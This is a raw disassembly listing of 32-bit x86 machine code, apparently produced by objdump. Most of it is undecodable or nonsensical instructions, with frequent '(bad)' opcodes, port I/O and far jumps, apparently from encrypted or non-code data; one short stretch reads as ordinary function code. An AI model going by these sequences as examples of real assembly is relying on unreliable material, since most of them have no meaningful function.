  40f3e8:	imul   ebp,DWORD PTR [eiz*2+0xdcefb3b],0x8fe1eb67
  40f3f3:	push   0x6d
  40f3f5:	pop    es
  40f3f6:	loope  0x40f3d8
  40f3f8:	ins    BYTE PTR es:[edi],dx
  40f3f9:	data16 (bad) 
  40f3fb:	xor    al,BYTE PTR [ecx+0x1b]
  40f3fe:	dec    ecx
  40f3ff:	(bad)  
  40f400:	xchg   ebx,eax
  40f401:	xchg   edx,eax
  40f402:	or     DWORD PTR [edi],0x3f
  40f405:	mov    edx,0xc69cf89c
  40f40a:	lds    ecx,FWORD PTR [esi]
  40f40c:	mov    ah,0x3a
  40f40e:	and    al,0x46
  40f410:	xor    DWORD PTR [ebx+0x2857f61f],0x91c7be8f
  40f41a:	inc    ecx
  40f41b:	push   edx
  40f41c:	fnsave [edi]
  40f41e:	and    cl,BYTE PTR [ebx+ebx*1-0x4ca4a668]
  40f425:	hlt    
  40f426:	rcl    BYTE PTR [edx-0x9a6654d],0x26
  40f42d:	shl    DWORD PTR ds:0xd7bc22bc,0x94
  40f434:	cmp    al,BYTE PTR [eax+0x52563cb2]
  40f43a:	and    al,0x45
  40f43c:	sahf   
  40f43d:	pop    ebx
  40f43e:	cwde   
  40f43f:	lahf   
  40f440:	and    eax,0xbd4475f0
  40f445:	xchg   esp,eax
  40f446:	test   BYTE PTR [edx-0x61],al
  40f449:	popa   
  40f44a:	inc    edx
  40f44b:	push   0x1776f389
  40f450:	sbb    bh,BYTE PTR ds:0xd6937a7
  40f456:	shl    BYTE PTR [ecx-0x7],1
  40f459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f45a:	pop    eax
  40f45b:	inc    ebx
  40f45c:	pushf  
  40f45d:	sub    cl,BYTE PTR [edx-0x2c]
  40f460:	ja     0x40f45f
  40f462:	xchg   esp,eax
  40f463:	pop    ebx
  40f464:	or     al,0x27
  40f466:	inc    eax
  40f467:	mov    ds:0x3c71b298,al
  40f46c:	mov    edx,0xccbb2bc1
  40f471:	mov    ebx,0x43d6e397
  40f476:	(bad)  
  40f477:	pop    esi
  40f478:	shr    ebx,1
  40f47a:	stc    
  40f47b:	fwait
  40f47c:	idiv   DWORD PTR [edx+0x1c8fe8e9]
  40f482:	xor    DWORD PTR [ecx-0x2d577831],esp
  40f488:	fs in  eax,0x43
  40f48b:	test   dh,ah
  40f48d:	dec    edx
  40f48e:	push   edi
  40f48f:	adc    al,0x25
  40f491:	sub    ah,BYTE PTR [esi]
  40f493:	loopne 0x40f49d
  40f495:	mov    esi,0x7b6b3fbb
  40f49a:	sbb    DWORD PTR [edi-0x45],esp
  40f49d:	scas   eax,DWORD PTR es:[edi]
  40f49e:	mov    edi,0xd0329c9
  40f4a3:	cmp    ah,BYTE PTR [ebx+0x4b4f3cfe]
  40f4a9:	shl    BYTE PTR [eax+eax*1],cl
  40f4ac:	mov    ecx,0x3550cbb1
  40f4b1:	repnz mov bl,0x32
  40f4b4:	jo     0x40f481
  40f4b6:	std    
  40f4b7:	adc    BYTE PTR [esi-0x7e],ah
  40f4ba:	addr16 sub bh,bh
  40f4bd:	and    al,0x70
  40f4bf:	mov    bl,0xfd
  40f4c1:	cdq    
  40f4c2:	jle    0x40f521
  40f4c4:	test   BYTE PTR [ecx-0x99f5015],cl
  40f4ca:	or     ebp,DWORD PTR ds:0xaba4d273
  40f4d0:	cmc    
  40f4d1:	(bad)  
  40f4d2:	dec    ebp
  40f4d3:	(bad)  [eax+eiz*1]
  40f4d6:	xor    dh,BYTE PTR [esi-0x7010be22]
  40f4dc:	aas    
  40f4dd:	push   esp
  40f4de:	cld    
  40f4df:	mov    ds:0x936a4472,eax
  40f4e4:	xor    eax,0xa2bebccf
  40f4e9:	and    ah,BYTE PTR ds:0xe3f7152a
  40f4ef:	in     eax,dx
  40f4f0:	aad    0x8a
  40f4f2:	aaa    
  40f4f3:	mov    esi,0x55dccc6e
  40f4f8:	jmp    0x40f52a
  40f4fa:	mov    BYTE PTR [edi+edi*4+0x49],cl
  40f4fe:	dec    eax
  40f4ff:	hlt    
  40f500:	or     al,0xd3
  40f502:	scas   al,BYTE PTR es:[edi]
  40f503:	mov    ds:0xa94518fa,al
  40f508:	call   FWORD PTR [eax-0x21]
  40f50b:	and    esi,DWORD PTR [ebx]
  40f50d:	test   BYTE PTR [ecx+0x458bec4d],0xd8
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   ax,dx
  40f526:	add    al,0x5b
  40f528:	movzx  ebp,BYTE PTR [edi+0x7d497070]
  40f52f:	jo     0x40f5a1
  40f531:	pop    eax
  40f532:	mov    ch,0x75
  40f534:	sbb    edi,DWORD PTR [ebp-0x6277d758]
  40f53a:	int    0x51
  40f53c:	cwde   
  40f53d:	leave  
  40f53e:	jb     0x40f502
  40f540:	jp     0x40f4d9
  40f542:	mov    ?,WORD PTR [ebx-0x1cd108ba]
  40f548:	stos   DWORD PTR es:[edi],eax
  40f549:	lds    eax,FWORD PTR [esi]
  40f54b:	(bad)  
  40f54c:	sti    
  40f54d:	loopne 0x40f59a
  40f54f:	test   eax,0xcc56e9a8
  40f554:	test   DWORD PTR cs:[ebp-0x55],eax
  40f558:	fmul   DWORD PTR ds:[eax+edi*1]
  40f55c:	mov    al,ds:0x17df0dde
  40f561:	sahf   
  40f562:	test   eax,0x503e3e66
  40f567:	out    0x63,al
  40f569:	das    
  40f56a:	fadd   QWORD PTR [ecx-0x742089eb]
  40f570:	ds adc edi,edi
  40f573:	fucomi st,st(4)
  40f575:	cmp    esi,eax
  40f577:	dec    edx
  40f578:	pop    ebx
  40f579:	pop    esi
  40f57a:	fwait
  40f57b:	pop    esp
  40f57c:	test   BYTE PTR [eax],ah
  40f57e:	ficomp WORD PTR [esi-0xbb160ce]
  40f584:	or     esp,DWORD PTR [edx]
  40f586:	sbb    cl,BYTE PTR [ecx-0x13aadbb4]
  40f58c:	xlat   BYTE PTR ds:[ebx]
  40f58d:	fsub   st,st(1)
  40f58f:	outs   dx,BYTE PTR gs:[esi]
  40f591:	cmp    cl,ah
  40f593:	adc    al,0xf1
  40f595:	mov    bh,cl
  40f597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f598:	mov    edx,0x9000b8f2
  40f59d:	sbb    ch,BYTE PTR [eax-0x39]
  40f5a0:	sub    DWORD PTR [edx+ecx*4-0xba9bc04],0x434a3138
  40f5ab:	sar    DWORD PTR [esi-0x7fddcd05],cl
  40f5b1:	adc    ebx,DWORD PTR [edx+0x69776cc6]
  40f5b7:	(bad)  
  40f5b8:	clc    
  40f5b9:	xchg   ebx,eax
  40f5ba:	rcl    BYTE PTR [edi],cl
  40f5bc:	out    dx,eax
  40f5bd:	stc    
  40f5be:	adc    DWORD PTR [esi],eax
  40f5c0:	outs   dx,BYTE PTR ds:[esi]
  40f5c1:	inc    esi
  40f5c2:	shl    BYTE PTR [ecx-0x65],cl
  40f5c5:	fistp  WORD PTR [edx+0x1f]
  40f5c8:	push   0xf
  40f5ca:	jmp    0x1fd5cd90
  40f5cf:	clc    
  40f5d0:	into   
  40f5d1:	lea    ecx,[ebp+0x50d4281e]
  40f5d7:	pop    eax
  40f5d8:	imul   ebp,DWORD PTR [edi-0x3d],0xf4a10701
  40f5df:	push   ds
  40f5e0:	sub    edi,eax
  40f5e2:	fwait
  40f5e3:	cli    
  40f5e4:	dec    ebp
  40f5e5:	stos   BYTE PTR es:[edi],al
  40f5e6:	out    dx,eax
  40f5e7:	jmp    0x9a0:0xe7124598
  40f5ee:	pushf  
  40f5ef:	fsub   DWORD PTR [edi]
  40f5f1:	jb     0x40f5ed
  40f5f3:	add    al,BYTE PTR [eax-0x16]
  40f5f6:	js     0x40f644
  40f5f8:	cmp    eax,eax
  40f5fa:	mov    ecx,cs
  40f5fc:	jl     0x40f65e
  40f5fe:	enter  0xaa16,0x16
  40f602:	or     BYTE PTR [esi],dl
  40f604:	test   BYTE PTR [esi+0x49],0x12
  40f608:	adc    esi,ecx
  40f60a:	adc    bl,BYTE PTR [esi]
  40f60c:	das    
  40f60d:	jg     0x40f5f1
  40f60f:	bound  esi,QWORD PTR [ecx-0x4649f96a]
  40f615:	cwde   
  40f616:	inc    edx
  40f617:	mov    ?,WORD PTR [ebx]
  40f619:	fs daa 
  40f61b:	inc    ebx
  40f61c:	mov    dl,0xa5
  40f61e:	test   BYTE PTR [ecx+0x10ce7324],0xc7
  40f625:	xchg   esp,eax
  40f626:	sub    bh,ch
  40f628:	test   eax,0x17af059
  40f62d:	dec    ebp
  40f62e:	(bad)  
  40f62f:	dec    edi
  40f630:	dec    esp
  40f631:	xor    DWORD PTR ds:0x93932fa3,eax
  40f637:	addr16 push ecx
  40f639:	xchg   edx,eax
  40f63a:	or     DWORD PTR [edi-0x38f60de3],ebx
  40f640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f641:	mov    ds:0xbde3589d,eax
  40f646:	aas    
  40f647:	fimul  DWORD PTR [edi+eax*4-0x73]
  40f64b:	push   ebx
  40f64c:	push   DWORD PTR [ecx+eiz*4]
  40f64f:	jecxz  0x40f63a
  40f651:	in     eax,0x89
  40f653:	cmp    DWORD PTR [edi+ebp*4],0xfbf7e715
  40f65a:	mov    dh,0x33
  40f65c:	pop    ecx
  40f65d:	into   
  40f65e:	xchg   esi,eax
  40f65f:	adc    BYTE PTR [edi-0x78],dl
  40f662:	(bad)  
  40f663:	push   edi
  40f664:	and    BYTE PTR [eax-0x35],bh
  40f667:	xchg   esi,eax
  40f668:	lock addr16 or eax,0x9d64268f
  40f66f:	xor    eax,0xb5a949a5
  40f674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f675:	jl     0x40f612
  40f677:	dec    esi
  40f678:	out    0x43,eax
  40f67a:	lods   al,BYTE PTR ds:[esi]
  40f67b:	and    eax,0x5c3a068
  40f680:	push   0x77
  40f682:	enter  0xe72f,0x67
  40f686:	into   
  40f687:	push   ebx
  40f688:	stc    
  40f689:	sub    BYTE PTR [edi+esi*4-0xa],ch
  40f68d:	inc    ecx
  40f68e:	xchg   DWORD PTR [ecx-0x2d9f64fc],esp
  40f694:	rol    DWORD PTR [eax],cl
  40f696:	jl     0x40f714
  40f698:	shr    DWORD PTR [edx-0x54036d5],cl
  40f69e:	into   
  40f69f:	jns    0x40f6e1
  40f6a1:	jb     0x40f62d
  40f6a3:	xor    eax,0x3a0d8347
  40f6a8:	pop    esp
  40f6a9:	test   al,0xd1
  40f6ab:	push   edx
  40f6ac:	das    
  40f6ad:	fmul   QWORD PTR ds:0x510cb1a2
  40f6b3:	fimul  WORD PTR [eax+eax*1-0x10]
  40f6b7:	daa    
  40f6b8:	jle    0x40f67b
  40f6ba:	inc    ecx
  40f6bb:	mov    ds:0xfd652905,al
  40f6c0:	test   DWORD PTR [ebx+0x27],ebp
  40f6c3:	gs loop 0x40f6c2
  40f6c6:	fwait
  40f6c7:	dec    ecx
  40f6c8:	mov    eax,0xc8cdfb4b
  40f6cd:	fs (bad) 
  40f6cf:	fdiv   st,st(3)
  40f6d1:	ins    DWORD PTR es:[edi],dx
  40f6d2:	into   
  40f6d3:	fs icebp 
  40f6d5:	or     eax,0x85456d03
  40f6da:	xor    BYTE PTR [eax+0x4d],ch
  40f6dd:	mov    edi,0x1f6eb0db
  40f6e2:	iret   
  40f6e3:	enter  0x946,0xeb
  40f6e7:	dec    edi
  40f6e8:	mov    cl,0x5d
  40f6ea:	add    BYTE PTR [eax-0x23],ch
  40f6ed:	sub    DWORD PTR ds:0x8db9ce05,0xffffffa1
  40f6f4:	stos   DWORD PTR es:[edi],eax
  40f6f5:	scas   eax,DWORD PTR es:[edi]
  40f6f6:	push   edi
  40f6f7:	dec    esi
  40f6f9:	nop
  40f6fa:	inc    esi
  40f6fb:	shl    esp,1
  40f6fd:	add    DWORD PTR [edx-0x24],esi
  40f700:	cmp    eax,0xe00f3bdf
  40f705:	sahf   
  40f706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f707:	inc    eax
  40f708:	xlat   BYTE PTR ds:[ebx]
  40f709:	in     eax,dx
  40f70a:	xor    ch,BYTE PTR [eax-0x4d]
  40f70d:	cdq    
  40f70e:	out    dx,eax
  40f70f:	ss call 0x1172:0x85dcc13d
  40f717:	dec    ebx
  40f718:	push   esp
  40f719:	out    0x39,eax
  40f71b:	nop
  40f71c:	xor    DWORD PTR [ecx-0x73],esp
  40f71f:	push   ecx
  40f720:	nop
  40f721:	sbb    ch,BYTE PTR [esi+0x8765d1f]
  40f727:	ja     0x40f6e9
  40f729:	into   
  40f72a:	add    BYTE PTR [eax],dh
  40f72c:	or     BYTE PTR [eax],cl
  40f72e:	sbb    DWORD PTR [esi],esi
  40f730:	call   0xe9d5:0x28a7e022
  40f737:	outs   dx,DWORD PTR ds:[esi]
  40f738:	add    BYTE PTR [edx+eax*1],0xf9
  40f73c:	push   ecx
  40f73d:	or     BYTE PTR [eax-0x7300b346],ch
  40f743:	mov    ah,0x13
  40f745:	jns    0x40f7b5
  40f747:	push   ecx
  40f748:	add    al,0x8f
  40f74a:	iret   
  40f74b:	ins    BYTE PTR es:[edi],dx
  40f74c:	cmp    DWORD PTR [edi-0x23],esi
  40f74f:	pop    esi
  40f750:	xchg   ebp,eax
  40f751:	jns    0x40f72b
  40f753:	pop    ecx
  40f754:	aaa    
  40f755:	rol    BYTE PTR [esi+0x58],0x27
  40f759:	or     bh,dl
  40f75b:	call   0x145c:0xee787f69
  40f762:	xor    eax,DWORD PTR [ecx-0x6b]
  40f765:	sub    al,0x8a
  40f767:	mov    WORD PTR [edi],gs
  40f769:	ins    BYTE PTR es:[edi],dx
  40f76a:	xchg   edi,eax
  40f76b:	sbb    DWORD PTR [ebp-0x64],ebp
  40f76e:	pop    eax
  40f76f:	sar    DWORD PTR [ecx-0x6b],cl
  40f772:	sbb    al,ah
  40f774:	cwde   
  40f775:	dec    ebp
  40f776:	(bad)  
  40f777:	dec    ecx
  40f778:	lds    esp,FWORD PTR [ebp-0x5fe70d06]
  40f77e:	cmp    al,0xfe
  40f780:	dec    ebp
  40f781:	jg     0x40f7ea
  40f783:	push   eax
  40f784:	test   BYTE PTR [eax-0x8],dl
  40f787:	fsub   QWORD PTR [esi]
  40f789:	test   eax,0x7b513e65
  40f78e:	out    0x98,al
  40f790:	cmp    ecx,DWORD PTR [ebp+0x58]
  40f793:	dec    edi
  40f794:	xor    DWORD PTR [eax-0x48de4404],edx
  40f79a:	xchg   ebx,eax
  40f79b:	jmp    0x4f8c:0xc0c29334
  40f7a2:	or     al,0x1
  40f7a4:	mov    ds:0x85bab0b4,eax
  40f7a9:	jnp    0x40f7da
  40f7ab:	popa   
  40f7ac:	out    dx,al
  40f7ad:	retf   
  40f7ae:	lods   al,BYTE PTR ds:[esi]
  40f7af:	jg     0x40f781
  40f7b1:	das    
  40f7b2:	mov    ebp,0xa5c63c20
  40f7b7:	mov    cl,0x64
  40f7b9:	gs sub al,0xd4
  40f7bc:	jmp    DWORD PTR ss:[esi]
  40f7bf:	(bad)  
  40f7c0:	lock aas 
  40f7c2:	add    BYTE PTR [eax-0x23],dh
  40f7c5:	xor    eax,0x47826f74
  40f7ca:	push   ebx
  40f7cb:	lods   eax,DWORD PTR ds:[esi]
  40f7cc:	cs jg  0x40f7a2
  40f7cf:	(bad)  
  40f7d0:	shr    BYTE PTR [ecx],cl
  40f7d2:	les    eax,FWORD PTR [edx+0xb]
  40f7d5:	mov    cl,0xb8
  40f7d7:	stos   BYTE PTR es:[edi],al
  40f7d8:	clc    
  40f7d9:	arpl   WORD PTR [esi+0x16b06067],di
  40f7df:	mov    esp,0x5e912b2f
  40f7e4:	jo     0x40f846
  40f7e6:	mov    ds:0x285643e9,al
  40f7eb:	ror    BYTE PTR [ecx+0x22f492d8],0xd
  40f7f2:	sub    eax,0x85e6b335
  40f7f7:	dec    ecx
  40f7f8:	pop    ecx
  40f7f9:	inc    ecx
  40f7fa:	xor    eax,0xb214dcbf
  40f7ff:	or     eax,0x76fa985f
  40f804:	or     edx,DWORD PTR [esp+edi*2-0x5]
  40f808:	or     eax,0x2af06847
  40f80d:	adc    BYTE PTR [ebx-0x61],ah
  40f810:	xor    BYTE PTR [edi-0x14],bh
  40f813:	int    0x73
  40f815:	lds    ecx,FWORD PTR [ebp-0x72]
  40f818:	and    edi,eax
  40f81a:	in     al,dx
  40f81b:	push   ecx
  40f81c:	push   0xa
  40f81e:	mov    ebx,0xecd06f71
  40f823:	jp     0x40f807
  40f825:	mov    bh,BYTE PTR [ebp-0x535c73f3]
  40f82b:	sub    DWORD PTR [edx-0x4fc89aed],edx
  40f831:	jno    0x40f7d1
  40f833:	mov    eax,0x878aa933
  40f838:	(bad)  
  40f839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83a:	adc    eax,0xa6f7d831
  40f840:	enter  0xfcfa,0xfd
  40f844:	sbb    cl,bh
  40f846:	cdq    
  40f847:	fst    st(6)
  40f849:	lds    eax,FWORD PTR [esi+0x67]
  40f84c:	xchg   ecx,eax
  40f84d:	jmp    0x5c57af86
  40f852:	gs (bad) 
  40f854:	outs   dx,DWORD PTR ds:[esi]
  40f855:	sbb    DWORD PTR [edx-0x2614d6af],0x3e
  40f85c:	inc    esp
  40f85d:	sbb    al,0x25
  40f85f:	sbb    ecx,esp
  40f861:	ret    0x91af
  40f864:	aas    
  40f865:	jns    0x40f8e2
  40f867:	pop    ebx
  40f868:	pop    ebp
  40f869:	mov    al,ds:0x8cc9fda7
  40f86e:	stc    
  40f86f:	fiadd  WORD PTR [ecx-0x191ccf74]
  40f875:	fwait
  40f876:	sti    
  40f877:	retf   0x1f5a
  40f87a:	mov    BYTE PTR ds:0x2f0f70f,bh
  40f880:	xor    bl,bl
  40f882:	stos   DWORD PTR es:[edi],eax
  40f883:	lods   eax,DWORD PTR ds:[esi]
  40f884:	inc    ebp
  40f885:	neg    DWORD PTR [ecx+0x15d36aaa]
  40f88b:	leave  
  40f88c:	inc    eax
  40f88d:	jecxz  0x40f86f
  40f88f:	fadd   st,st(5)
  40f891:	dec    ecx
  40f892:	and    al,0x71
  40f894:	or     BYTE PTR [edi+0x783842af],cl
  40f89a:	shr    BYTE PTR [esi-0x27],0xc2
  40f89e:	sti    
  40f89f:	neg    ecx
  40f8a1:	(bad)
  40f8a4:	push   eax
  40f8a5:	cld    
  40f8a6:	mov    DWORD PTR [eax-0x34],0x23dc9f5
  40f8ad:	das    
  40f8ae:	pop    ebp
  40f8af:	leave  
  40f8b0:	or     eax,0xa05bf909
  40f8b5:	adc    eax,0xc46f3d39
  40f8ba:	jmp    0x40f89f
  40f8bc:	sub    cl,bh
  40f8be:	inc    esp
  40f8bf:	push   0xf16c8a29
  40f8c4:	(bad)  
  40f8c6:	cdq    
  40f8c7:	push   0xffffffea
  40f8c9:	mov    es,esi
  40f8cb:	xchg   esp,eax
  40f8cc:	adc    ch,dl
  40f8ce:	(bad)  
  40f8cf:	adc    DWORD PTR [eax+0x44400da9],esi
  40f8d5:	in     al,dx
  40f8d6:	inc    edi
  40f8d7:	retf   0x4994
  40f8da:	shl    DWORD PTR [edx-0x14],1
  40f8dd:	lahf   
  40f8de:	(bad)  
  40f8df:	in     al,dx
  40f8e0:	scas   al,BYTE PTR es:[edi]
  40f8e1:	ret    
  40f8e2:	dec    ebp
  40f8e3:	cmp    BYTE PTR [ecx-0x3bd941eb],dl
  40f8e9:	adc    ecx,ebp
  40f8eb:	mov    fs,WORD PTR [ecx-0x2473741f]
  40f8f1:	mov    bl,0xcf
  40f8f3:	pusha  
  40f8f4:	xor    eax,0x4da71e9e
  40f8f9:	lock push ebx
  40f8fb:	inc    ecx
  40f8fc:	pushw  ss
  40f8fe:	into   
  40f8ff:	sbb    esp,DWORD PTR [eax-0x27]
  40f902:	stos   BYTE PTR es:[edi],al
  40f903:	pop    ebx
  40f904:	jge    0x40f919
  40f906:	stc    
  40f907:	int3   
  40f908:	mov    ecx,DWORD PTR [ebp+0x8]
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	add    ebx,DWORD PTR [ecx-0x547009e1]
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f935
  40f944:	leave  
  40f945:	xlat   BYTE PTR ds:[ebx]
  40f946:	pop    edi
  40f947:	add    esi,DWORD PTR [eax+0x34]
  40f94a:	inc    edx
  40f94b:	int    0x20
  40f94d:	and    DWORD PTR [edx+ecx*2-0x54899ade],esi
  40f954:	pop    ss
  40f955:	mov    al,ds:0x1a5e765d
  40f95a:	pop    ecx
  40f95b:	xor    eax,0xefbcdf71
  40f960:	sar    ch,1
  40f962:	and    BYTE PTR [edx-0x42c873bf],0xe
  40f969:	xlat   BYTE PTR ds:[bx]
  40f96b:	mov    eax,0x9e38b11e
  40f970:	xor    al,BYTE PTR [edi-0x6a]
  40f973:	dec    edx
  40f974:	ror    eax,0x34
  40f977:	and    al,0xc6
  40f979:	aas    
  40f97a:	inc    ecx
  40f97b:	sbb    al,0x25
  40f97d:	call   0x8ac5f1bd
  40f982:	jbe    0x40f925
  40f984:	push   esp
  40f985:	mov    ch,BYTE PTR [ebp-0x248134ba]
  40f98b:	adc    DWORD PTR [ebx],0x32482ae1
  40f991:	scas   al,BYTE PTR es:[edi]
  40f992:	dec    BYTE PTR [eax+0x1c]
  40f995:	push   ebp
  40f996:	in     eax,dx
  40f997:	pop    esp
  40f998:	or     eax,0x96957d76
  40f99d:	fsubr  QWORD PTR [edi+0x533a1ec]
  40f9a3:	retf   0x561b
  40f9a6:	(bad)  
  40f9a7:	adc    al,ch
  40f9a9:	sti    
  40f9aa:	(bad)  
  40f9ab:	jle    0x40f97b
  40f9ad:	scas   eax,DWORD PTR es:[edi]
  40f9ae:	xor    al,0x9
  40f9b0:	dec    eax
  40f9b1:	call   0x97e91a4d
  40f9b6:	cmp    BYTE PTR [ebp+0x397f0dfe],al
  40f9bc:	xchg   edx,eax
  40f9bd:	xor    DWORD PTR [ecx-0x267f54a8],ebx
  40f9c3:	je     0x40f9dc
  40f9c5:	ins    BYTE PTR es:[edi],dx
  40f9c6:	(bad)  
  40f9c8:	std    
  40f9c9:	cmp    al,0x8a
  40f9cb:	cld    
  40f9cc:	cmp    ch,BYTE PTR [eax-0x9]
  40f9cf:	mov    eax,ds:0xffbbef8b
  40f9d4:	icebp  
  40f9d5:	push   ecx
  40f9d6:	push   edx
  40f9d7:	scas   eax,DWORD PTR es:[edi]
  40f9d8:	lahf   
  40f9d9:	ss pop esi
  40f9db:	mov    bh,0x6a
  40f9dd:	rcl    DWORD PTR [ebp+0x1a4187d7],0x12
  40f9e4:	jb     0x40f9db
  40f9e6:	ss add al,0xa3
  40f9e9:	inc    ebp
  40f9ea:	mov    edi,DWORD PTR [esi]
  40f9ec:	bound  ecx,QWORD PTR [esi]
  40f9ee:	in     eax,0x20
  40f9f0:	dec    esp
  40f9f1:	pop    eax
  40f9f2:	pop    ss
  40f9f3:	and    eax,0xc2b7e7e9
  40f9f8:	mov    eax,ds:0x11e7fba0
  40f9fd:	int3   
  40f9fe:	inc    edx
  40f9ff:	mov    ch,0x66
  40fa01:	sub    BYTE PTR [ebx-0x25402bae],0xb3
  40fa08:	pop    edx
  40fa09:	jl     0x40fa07
  40fa0b:	out    dx,eax
  40fa0c:	cdq    
  40fa0d:	sub    al,0xd
  40fa0f:	sbb    edx,0x1fd5bed9
  40fa15:	stc    
  40fa16:	ds (bad) 
  40fa18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa19:	xor    ch,BYTE PTR [eax]
  40fa1b:	rol    esp,0x57
  40fa1e:	ret    0x1a55
  40fa21:	jne    0x40fa24
  40fa23:	pop    ebx
  40fa24:	push   esi
  40fa25:	jb     0x40fa1a
  40fa27:	imul   ecx,DWORD PTR ds:0x5cc236ee,0xffffffa2
  40fa2e:	sub    eax,0x3e86d50c
  40fa33:	sar    DWORD PTR [eax],cl
  40fa35:	push   ebp
  40fa36:	dec    esp
  40fa37:	xchg   ecx,eax
  40fa38:	push   ecx
  40fa39:	lahf   
  40fa3a:	adc    BYTE PTR [edi-0x3e],0x47
  40fa3e:	das    
  40fa3f:	xchg   ebp,ecx
  40fa41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa42:	push   esi
  40fa43:	inc    esp
  40fa44:	aas    
  40fa45:	ror    BYTE PTR [edx-0x1f],cl
  40fa48:	inc    ecx
  40fa49:	add    DWORD PTR [edx+0x1df6c29],eax
  40fa4f:	sbb    ah,BYTE PTR [edx]
  40fa51:	imul   eax,eax,0x24e0b99f
  40fa57:	dec    BYTE PTR [ecx-0x19]
  40fa5a:	pop    ebx
  40fa5b:	ret    
  40fa5c:	xchg   ecx,eax
  40fa5d:	xchg   esi,eax
  40fa5e:	int3   
  40fa5f:	loop   0x40fabf
  40fa61:	jnp    0x40fa76
  40fa63:	mov    edx,0xa0762daf
  40fa68:	adc    al,0x4a
  40fa6a:	sub    al,0xb7
  40fa6c:	aam    0xa0
  40fa6e:	jb     0x40fa76
  40fa70:	call   esi
  40fa72:	jmp    0xe8f1:0xe03f4de4
  40fa79:	js     0x40fa4f
  40fa7b:	dec    eax
  40fa7c:	out    dx,al
  40fa7d:	outs   dx,BYTE PTR ds:[esi]
  40fa7e:	inc    esp
  40fa7f:	or     al,0x86
  40fa81:	test   BYTE PTR [eax-0x33],0xa8
  40fa85:	inc    edx
  40fa86:	adc    ebp,DWORD PTR [eax-0x1b]
  40fa89:	cli    
  40fa8a:	ja     0x40fafe
  40fa8c:	not    BYTE PTR [ecx]
  40fa8e:	mov    ah,0x4c
  40fa90:	aad    0x24
  40fa92:	mov    dh,0xad
  40fa94:	or     BYTE PTR [ebp-0x576b751a],bh
  40fa9a:	nop
  40fa9b:	fs aad 0x65
  40fa9e:	jmp    0x96aefc13
  40faa3:	inc    ecx
  40faa4:	or     eax,0xfe1cdd1
  40faa9:	jge    0x40fb04
  40faab:	xchg   BYTE PTR [ebx+edi*2-0x15ed122d],cl
  40fab2:	adc    BYTE PTR [ebp+0x4e4b7c3c],0xc6
  40fab9:	call   0x2b59:0xd5b549e7
  40fac0:	inc    esi
  40fac1:	add    esp,DWORD PTR [ecx+0x62b61da3]
  40fac7:	test   al,0xc3
  40fac9:	jns    0x40fb22
  40facb:	test   eax,0x3968fac2
  40fad0:	push   ss
  40fad1:	arpl   WORD PTR ds:0x1e005f1d,si
  40fad7:	jg     0x40fb48
  40fad9:	xchg   ecx,eax
  40fada:	cmp    ecx,DWORD PTR [edi]
  40fadc:	nop
  40fadd:	data16 js 0x40fa94
  40fae0:	mov    esp,0xb24eb57f
  40fae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae6:	(bad)  
  40fae7:	ins    DWORD PTR es:[edi],dx
  40fae8:	leave  
  40fae9:	xlat   BYTE PTR ds:[ebx]
  40faea:	sub    al,0x66
  40faec:	cmc    
  40faed:	pop    es
  40faee:	pop    esi
  40faef:	jno    0x40fb5e
  40faf1:	inc    ebp
  40faf2:	jp     0x40fb6c
  40faf4:	pusha  
  40faf5:	add    al,0xc2
  40faf7:	and    ecx,DWORD PTR [eax]
  40faf9:	lea    edx,[ebp-0x46b9686a]
  40faff:	test   esp,esi
  40fb01:	xlat   BYTE PTR ds:[ebx]
  40fb02:	clc    
  40fb03:	add    ah,bh
  40fb05:	pushf  
  40fb06:	ror    bh,0x32
  40fb09:	ins    BYTE PTR es:[edi],dx
  40fb0a:	jp     0x40fb00
  40fb0c:	cwde   
  40fb0d:	mov    edi,0xb8218595
  40fb12:	cmp    BYTE PTR [esi],0x8a
  40fb15:	xchg   edi,eax
  40fb16:	xchg   ecx,eax
  40fb17:	adc    edx,DWORD PTR [edx+0x7e]
  40fb1a:	dec    ebp
  40fb1b:	fnstenv [ebx-0x72510f08]
  40fb21:	push   es
  40fb22:	ficomp DWORD PTR [esi+0x571e2668]
  40fb28:	or     bh,BYTE PTR [edx+0x3f142c0e]
  40fb2e:	cld    
  40fb2f:	(bad)  
  40fb30:	fisubr DWORD PTR [esi-0x3af7ede6]
  40fb36:	jns    0x40fb34
  40fb38:	lds    ebx,FWORD PTR [ebp-0x5]
  40fb3b:	or     eax,DWORD PTR [edx]
  40fb3d:	call   0x8146b102
  40fb42:	jl     0x40faf0
  40fb44:	in     eax,0x5d
  40fb46:	sub    eax,0xed00c53b
  40fb4b:	mov    ecx,0xbafde1db
  40fb50:	pop    eax
  40fb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb52:	sub    BYTE PTR [esi],al
  40fb54:	fdiv   DWORD PTR [edi+ebp*8-0x56e69dd4]
  40fb5b:	ja     0x40fb59
  40fb5d:	mov    esi,0xb9ee9af9
  40fb62:	mov    al,0xa2
  40fb64:	mov    esp,0x83ee408c
  40fb69:	sbb    esp,0x25
  40fb6c:	(bad)  
